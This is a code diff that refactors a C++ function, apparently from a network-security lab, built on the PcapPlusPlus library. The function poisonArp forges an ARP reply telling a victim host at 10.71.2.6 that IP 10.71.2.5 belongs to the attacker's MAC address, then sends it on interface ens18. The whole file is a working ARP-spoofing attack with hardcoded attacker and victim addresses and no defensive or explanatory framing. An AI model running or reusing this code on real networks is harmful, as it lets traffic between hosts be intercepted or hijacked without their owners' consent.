@@ -1,42 +1,48 @@
-#include "core.h"
-#include <ArpLayer.h>
 #include <EthLayer.h>
 #include <IpAddress.h>
 #include <MacAddress.h>
 #include <PcapLiveDeviceList.h>
-#include <cstdio>
+#include <core.h>
+#include <iostream>
 
+const int MAX_PACKET_LEN = 100;
+
+namespace ARP {
 void poisonArp() {
-  pcpp::MacAddress macAttacker("bc:24:11:e3:98:26");
-  pcpp::IPv4Address ipAttacker("10.71.2.7");
+    pcpp::MacAddress macAttacker("bc:24:11:e3:98:26");
+    pcpp::IPv4Address ipAttacker("10.71.2.7");
 
-  pcpp::MacAddress macVictim("bc:24:11:ef:65:94");
-  pcpp::IPv4Address ipVictim("10.71.2.6");
+    pcpp::MacAddress macVictim("bc:24:11:ef:65:94");
+    pcpp::IPv4Address ipVictim("10.71.2.6");
 
-  pcpp::IPv4Address ipToSpoof("10.71.2.5");
+    pcpp::IPv4Address ipToSpoof("10.71.2.5");
 
-  // Open interface
-  pcpp::PcapLiveDevice *dev =
-      pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByName("ens18");
+    // Open interface
+    pcpp::PcapLiveDevice *dev =
+        pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByName(
+            "ens18");
 
-  if (dev == nullptr || !dev->open()) {
-    fprintf(stderr, "cannot open interface\n");
-    exit(1);
-  }
+    if (dev == nullptr || !dev->open()) {
+        std::cerr << "Unable to open interface ens18" << "\n";
 
-  // Build ARP spoofing packet
-  pcpp::EthLayer ethLayer(macAttacker, macVictim, PCPP_ETHERTYPE_ARP);
+        // Entrypoint is not multi threaded
+        std::exit(1); // NOLINT(concurrency-mt-unsafe)
+    }
 
-  pcpp::ArpLayer arpLayer(pcpp::ARP_REPLY, macAttacker, macVictim, ipToSpoof,
-                          ipVictim);
+    // Build ARP spoofing packet
+    pcpp::EthLayer ethLayer(macAttacker, macVictim, PCPP_ETHERTYPE_ARP);
 
-  pcpp::Packet packet(100);
-  packet.addLayer(&ethLayer);
-  packet.addLayer(&arpLayer);
-  packet.computeCalculateFields();
+    pcpp::ArpLayer arpLayer(pcpp::ARP_REPLY, macAttacker, macVictim, ipToSpoof,
+                            ipVictim);
 
-  // Send packet
-  dev->sendPacket(&packet);
+    pcpp::Packet packet(MAX_PACKET_LEN);
+    packet.addLayer(&ethLayer);
+    packet.addLayer(&arpLayer);
+    packet.computeCalculateFields();
 
-  dev->close();
+    // Send packet
+    dev->sendPacket(&packet);
+
+    dev->close();
 }
+} // namespace ARP
